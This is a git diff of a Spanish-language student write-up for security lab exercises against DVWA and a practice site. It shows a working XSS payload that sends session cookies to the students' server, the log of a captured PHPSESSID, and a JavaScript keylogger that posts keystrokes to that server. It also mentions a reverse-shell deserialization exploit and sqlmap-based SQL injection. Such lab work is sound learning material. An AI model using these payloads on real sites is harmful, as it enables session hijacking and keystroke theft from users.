@@ -34,3 +34,45 @@ Y teniendo en la cabeza que podria tener algo que ver con un problema en cuanto 
 Pensamos que se podia tratar de una vulnerabilidad en cuanto a la serializacion de node que nos permitiria ejecutar codigo remotamente.
 
 Buscando como poder explotar esta vulnerabilidad encontramos el siguiente [link](https://mars-cheng.github.io/blog/2018/Vulnhub-Temple-of-Doom-1-Write-up/) con un paso a paso sobre como explotar un fallo de seguiridad muy similar al encontrado en esta pagina usando un reverse shell attack y asi es posible obtener permisos de root.
+
+
+##### Ej 5 
+
+Primero realizamos el ataque basico de robo de cookies de sesion en cada una de las rutas, tanto en dvwa/vulnerabilities/xss_r/ como en /dvwa/vulnerabilities/xss_s/
+el ataque lo realizamos primero abriendo un servidor controlado por nosotros con el comando 
+        
+        python -m SimpleHTTPServer
+y luego enviando el siguiente input 
+
+        <script>var i = new Image; i.src = "http://192.168.0.70:8000/"+document.cookie ; </script>
+
+la ruta http://192.168.0.70:8000/ es nuestra ip y el puerto 8000 es donde esta seteado el SimpleHTTPServer
+
+obteniendo como salida:
+
+192.168.0.59 - - [27/Sep/2020 18:31:44] code 404, message File not found
+192.168.0.59 - - [27/Sep/2020 18:31:44] "GET /security=low;%20PHPSESSID=v5cco41lqjuufohli3o6v0cvl0;%20acopendivids=swingset,jotto,phpbb2,redmine;%20acgroupswithpersist=nada HTTP/1.1" 404 -
+
+obteniendo asi las cookies de sesion.
+en ambas rutas funciona igual con la diferencia de que en /dvwa/vulnerabilities/xss_s/ el comando queda guardado y luego se ejecuta cada vez que se ingresa a esa pestaña.
+
+Finalmente para realizar un ataque que capture las teclas presionadas por un usuario, se nos ocurrio intentar crear un script que envie mediante un post las teclas presionadas y almacenar estas en un archivo .txt 
+no encontre una menera facil de hacer un post con el modulo SimpleHTTPServer asi que decidi crear mi propio server.py el cual esta adjuntado. una vez creado el server diseñamos el script que es el siguiente:
+
+        <script type="text/javascript">
+                var l = "";        
+                document.onkeypress = function (e) {
+                        l += e.key;
+                var req = new XMLHttpRequest();
+                req.open("POST","<http://192.168.0.70:7900/>", true); 			
+                req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+                req.send("data=" + l);
+
+                }
+        </script>  
+basicamente este script mediante  XMLHttpRequest nos envia un post con cada una de las teclas presiondas y las guarda en un archivo data.txt    
+##### Ej 3
+Para resolver este ejrcicio vimos a que direcciones hacia request la pagina web, y de esta forma vimos que la pagina pedia sus imagenes en la siguiente ruta (server caido)
+investigando mas a fondo en esta ruta notamos que por ejeplo podiamos ingresar en la url cosas como (servercaido) obteniendo una imagen en base64 (es decir, contestaba nuestro request) por ende esto indicaba que probablemente la vulnerabilidad que existe en esta pagina web sea una sql injection.
+
+Cuando supimos esto encontramos una herramienta llamada sqlmap la cual nos permitia explotar esta vulnerabilidad y asi poder ver la base de datos de la pagina.
